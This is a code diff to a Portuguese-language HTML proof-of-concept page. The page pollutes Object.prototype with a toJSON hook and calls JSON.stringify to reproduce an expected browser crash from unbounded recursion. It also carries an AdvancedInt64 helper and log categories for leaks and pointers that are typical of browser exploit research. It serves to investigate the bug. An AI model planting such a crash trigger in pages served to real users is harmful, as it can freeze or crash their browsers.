@@ -2,19 +2,117 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PoC Isolado v2.3s - Sem Limite de Recursão (Crash Esperado)</title>
-    <style> /* ... estilos como antes ... */ </style>
+    <title>PoC Isolado v2.3s (Corrigido) - Sem Limite (Crash Esperado)</title>
+    <style>
+        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
+        #output {
+            background: #222;
+            border: 1px solid #444;
+            padding: 10px;
+            height: 80vh;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            margin-top: 10px;
+        }
+        .log-info { color: #6cf; } 
+        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } 
+        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } 
+        .log-vuln { color: #ff4444; font-weight: bold; } 
+        .log-good { color: #4CAF50; } 
+        .log-warn { color: #FFC107; } 
+        .log-error { color: #f44336; } 
+        .log-critical { color: #f0f; font-weight: bold; } 
+        .log-leak { color: #FF9800; font-weight: bold; } 
+        .log-ptr { color: #f0f; font-weight: bold; }
+        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
+    </style>
 </head>
 <body>
-    <h1>PoC Isolado v2.3s - Sem Limite de Recursão (Crash/Lentidão Esperada)</h1>
+    <h1>PoC Isolado v2.3s (Corrigido) - Sem Limite de Recursão (Crash/Lentidão Esperada)</h1>
     <p>Este teste remove o limite de recursão para tentar replicar o crash original. FOCO NO CONSOLE DO NAVEGADOR.</p>
-    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste v2.3s</button>
+    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste v2.3s (Corrigido)</button>
     <div id="output"></div>
 
     <script>
-        // AdvancedInt64 e generalUtils como antes...
-        class AdvancedInt64 { /* ... (código completo como antes) ... */ }
-        const generalUtils = { /* ... (código completo como antes) ... */ };
+        // --- Utilitários ---
+        class AdvancedInt64 { 
+            constructor(low, high) {
+                let buffer = new Uint32Array(2);
+                let bytes = new Uint8Array(buffer.buffer);
+                if (arguments.length > 2) { throw TypeError('AdvancedInt64 takes at most 2 args'); }
+                if (arguments.length === 0) { throw TypeError('AdvancedInt64 takes at min 1 args'); }
+                let is_one = false;
+                if (arguments.length === 1) { is_one = true; }
+                if (!is_one) {
+                    if (typeof (low) !== 'number' && typeof (high) !== 'number') {
+                        throw TypeError('low/high must be numbers');
+                    }
+                }
+                const check_range = (x) => (-0x80000000 <= x) && (x <= 0xffffffff);
+                if (typeof low === 'number') {
+                    if (!check_range(low)) { throw TypeError('low not a valid value: ' + low); }
+                    if (is_one) {
+                        high = 0;
+                        if (low < 0) { high = -1; }
+                    } else {
+                        if (!check_range(high)) { throw TypeError('high not a valid value: ' + high); }
+                    }
+                    buffer[0] = low;
+                    buffer[1] = high;
+                } else if (typeof low === 'string') {
+                    let hexstr = low;
+                    if (hexstr.substring(0, 2) === "0x") { hexstr = hexstr.substring(2); }
+                    if (hexstr.length % 2 === 1) { hexstr = '0' + hexstr; }
+                    if (hexstr.length > 16) { hexstr = hexstr.substring(hexstr.length - 16); }
+                    else { hexstr = hexstr.padStart(16, '0');}
+                    for (let i = 0; i < 8; i++) {
+                        bytes[i] = parseInt(hexstr.slice(14 - i*2, 16 - i*2), 16);
+                    }
+                } else if (typeof low === 'object') {
+                    if (low instanceof AdvancedInt64) {
+                        bytes.set(low.bytes);
+                    } else if (low.length === 8) {
+                        bytes.set(low);
+                    } else { throw TypeError("Array must have exactly 8 elements."); }
+                } else {
+                    throw TypeError('AdvancedInt64 does not support your object for conversion');
+                }
+                this.buffer = buffer;
+                this.bytes = bytes;
+            }
+            low() { return this.buffer[0]; }
+            high() { return this.buffer[1]; }
+            toString(is_pretty) {
+                let lowStr = this.low().toString(16).padStart(8, '0');
+                let highStr = this.high().toString(16).padStart(8, '0');
+                if (is_pretty) {
+                    highStr = highStr.substring(0, 4) + '_' + highStr.substring(4);
+                    lowStr = lowStr.substring(0, 4) + '_' + lowStr.substring(4);
+                    return '0x' + highStr + '_' + lowStr;
+                }
+                return '0x' + highStr + lowStr;
+            }
+        }
+
+        const generalUtils = {
+            logToDiv: (divId, message, type = 'info', funcName = '') => {
+                const outputDiv = document.getElementById(divId);
+                if (!outputDiv) {
+                    console.error(`[${funcName}] ERRO FATAL: Div de log '${divId}' não encontrada.`);
+                    return;
+                }
+                try {
+                    const timestamp = `[${new Date().toLocaleTimeString()}]`;
+                    const prefix = funcName ? `[${funcName}] ` : '';
+                    const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                    const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
+                    if(outputDiv.innerHTML.length > 300000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 150000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; }
+                    outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
+                    outputDiv.scrollTop = outputDiv.scrollHeight;
+                } catch(e) { console.error(`Erro DENTRO de generalUtils.logToDiv:`, e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR INTERNO] ${String(e)}\n`; }
+            }
+        };
+        // --- Fim Utilitários ---
 
         const outputDivS1 = document.getElementById('output');
         const runBtn = document.getElementById('runBtn');    
@@ -22,9 +120,9 @@
 
         const logS1 = (message, type = 'info', funcName = '') => {
             console.log(`[${type.toUpperCase()}] ${funcName ? '['+funcName+'] ' : ''}${message}`);
-            const targetDiv = document.getElementById('output');
-            if (targetDiv) { try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if(targetDiv.innerHTML.length > 300000){ targetDiv.innerHTML = targetDiv.innerHTML.substring(targetDiv.innerHTML.length - 150000); targetDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + targetDiv.innerHTML; } targetDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; targetDiv.scrollTop = targetDiv.scrollHeight; } catch(e) { console.error(`Erro DENTRO de logS1 (para div):`, e); }}
+            generalUtils.logToDiv('output', message, type, funcName);
         };
+
         const PAUSE_S1_FUNC = (ms = 10) => new Promise(r => setTimeout(r, ms));
         
         const testObject_s = { p1_s: "val_s1", p2_s: "val_s2", p3_s: { nested_s: true } };
@@ -44,32 +142,31 @@
                 callCount_toJSON_s++;
                 let logPrefix = `toJSON PoC v2.3s (Call ${callCount_toJSON_s})`;
                 
+                lastThisBeforeObjectKeys_s = this; 
+
                 let thisIdentifier = "unknown_this_s";
                 if (this === testObject_s) thisIdentifier = "ROOT_S";
                 else if (this === testObject_s.p3_s) thisIdentifier = "NESTED_P3_S";
                 else if (Array.isArray(this)) thisIdentifier = "ARRAY_S";
                 else if (this && typeof this === 'object' && this.hasOwnProperty('final_structure_s')) thisIdentifier = "PREV_RETURN_OBJ_S";
 
-                // Log ANTES de Object.keys, focado no console
                 console.log(`%c${logPrefix} - INVOKED! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, "background: #111; color: #FFD700");
-                lastThisBeforeObjectKeys_s = this; // Salva 'this'
-                // console.dir(this); // DESCOMENTE COM MUITO CUIDADO, pode ser o que causa lentidão por si só se 'this' for complexo
+                // console.dir(this); // DESCOMENTE COM MUITO CUIDADO
 
                 let keys = [];
                 try {
-                    // PONTO CRÍTICO
+                    console.log(`%c${logPrefix} - PRESTES a chamar Object.keys(this) para id='${thisIdentifier}'`, "color:red; font-weight:bold;");
                     keys = Object.keys(this); 
-                    lastKeysFromObjectKeys_s = keys; // Salva as chaves
+                    lastKeysFromObjectKeys_s = keys; 
                     console.log(`%c${logPrefix} - Object.keys(this) SUCESSO para id='${thisIdentifier}'. Chaves: [${keys.join(',')}]`, "color:lime");
                     
-                    // Este é o retorno que causa a recursão problemática
                     return { 
                         final_structure_s: true, 
                         payload_keys_s: keys 
                     };
                 } catch (e) {
                     console.error(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}':`, e);
-                    logS1(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}': ${e.message}`, 'error', 'toJSON_s'); // Log na div se possível
+                    logS1(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}': ${e.message}`, 'error', 'toJSON_s');
                     return { "error_in_toJSON_s": true, "message": String(e.message) };
                 }
             };
@@ -85,42 +182,45 @@
             logS1("Object.prototype.toJSON restaurado.", 'good', 'cleanup_s');
         }
 
-        async function runTest_v23s() {
-            document.querySelectorAll('button').forEach(b => b.disabled = true);
-            if (outputDivS1) outputDivS1.innerHTML = '';
-            logS1(`==== INICIANDO PoC Isolado v2.3s (SEM Limite de Recursão - CRASH ESPERADO) ====`, 'test', 'runTest_s');
+        // Nome da função principal corrigido para runIsolatedTest
+        async function runIsolatedTest() { 
+            if (runBtn) runBtn.disabled = true;
+            const outputDiv = document.getElementById('output');
+            if (outputDiv) outputDiv.innerHTML = '';
+            
+            console.log("%crunIsolatedTest (v2.3s Corrigido) FOI CHAMADA!", "font-weight:bold; color:green;");
+            logS1("==== INICIANDO PoC Isolado v2.3s (SEM Limite de Recursão - CRASH ESPERADO) ====", 'test', 'runIsolatedTest');
 
             setupPrototypePollution_s();
             
-            logS1(`Tentando JSON.stringify em testObject_s...`, 'critical', 'runTest_s');
+            logS1(`Tentando JSON.stringify em testObject_s...`, 'critical', 'runIsolatedTest');
             let result_s;
             try {
-                result_s = JSON.stringify(testObject_s); // ONDE O PROBLEMA OCORRE
+                result_s = JSON.stringify(testObject_s); 
                 
-                logS1(`JSON.stringify CONCLUÍDO (INESPERADO!). Resultado: ${result_s ? String(result_s).substring(0, 500) : "N/A"}`, 'warn', 'runTest_s');
+                logS1(`JSON.stringify CONCLUÍDO (INESPERADO!). Resultado: ${result_s ? String(result_s).substring(0, 500) : "N/A"}`, 'warn', 'runIsolatedTest');
             } catch (e) {
-                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runTest_s');
-                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runTest_s');
+                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runIsolatedTest');
+                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runIsolatedTest');
                 console.error("ERRO durante JSON.stringify em runTest_s:", e);
             } finally {
-                logS1("Entrou no finally de testPPJsonHijack_v23s.", 'info', 'runTest_s');
+                logS1("Entrou no finally de runIsolatedTest (após JSON.stringify).", 'info', 'runIsolatedTest'); // Modificado para clareza
                 if (lastThisBeforeObjectKeys_s) {
                      console.log("%c--- DADOS FINAIS CAPTURADOS (Chamada " + callCount_toJSON_s + ") ---", "background:red; color:white; font-size:1.2em;");
                      console.log("%cÚLTIMO 'THIS' ANTES DO PROBLEMA:", "color:orange; font-weight:bold;");
                      console.dir(lastThisBeforeObjectKeys_s);
-                     logS1(`ÚLTIMO 'THIS' (Call ${callCount_toJSON_s}): id=${lastThisBeforeObjectKeys_s === testObject_s ? "ROOT_S" : (Array.isArray(lastThisBeforeObjectKeys_s) ? "ARRAY_S" : "OTHER_S")}, typeof=${typeof lastThisBeforeObjectKeys_s}, constructor=${lastThisBeforeObjectKeys_s && lastThisBeforeObjectKeys_s.constructor ? lastThisBeforeObjectKeys_s.constructor.name : 'N/A'}`, 'leak', 'runTest_s');
+                     logS1(`ÚLTIMO 'THIS' (Call ${callCount_toJSON_s}): id=${lastThisBeforeObjectKeys_s === testObject_s ? "ROOT_S" : (Array.isArray(lastThisBeforeObjectKeys_s) ? "ARRAY_S" : "OTHER_S")}, typeof=${typeof lastThisBeforeObjectKeys_s}, constructor=${lastThisBeforeObjectKeys_s && lastThisBeforeObjectKeys_s.constructor ? lastThisBeforeObjectKeys_s.constructor.name : 'N/A'}`, 'leak', 'runIsolatedTest');
                      if(lastKeysFromObjectKeys_s) {
                         console.log("%cÚLTIMAS 'KEYS' OBTIDAS DE Object.keys(this):", "color:orange; font-weight:bold;");
                         console.log(lastKeysFromObjectKeys_s);
-                        logS1(`  ÚLTIMAS 'KEYS': [${lastKeysFromObjectKeys_s.join(',')}]`, 'leak', 'runTest_s');
+                        logS1(`  ÚLTIMAS 'KEYS': [${lastKeysFromObjectKeys_s.join(',')}]`, 'leak', 'runIsolatedTest');
                      }
                 }
                 cleanupPrototypePollution_s();
             }
             
-            // Não haverá PAUSE_LAB aqui para não interferir na captura do estado final
-            logS1(`\n==== PoC Isolado v2.3s CONCLUÍDO (verifique o console para o estado antes do travamento/lentidão) ====`, 'test', 'runTest_s');
-            document.querySelectorAll('button').forEach(b => b.disabled = false);
+            logS1(`\n==== PoC Isolado v2.3s (Corrigido) CONCLUÍDO (verifique o console para o estado antes do travamento/lentidão) ====`, 'test', 'runIsolatedTest');
+            if (runBtn) runBtn.disabled = false;
         }
     </script>
 </body>
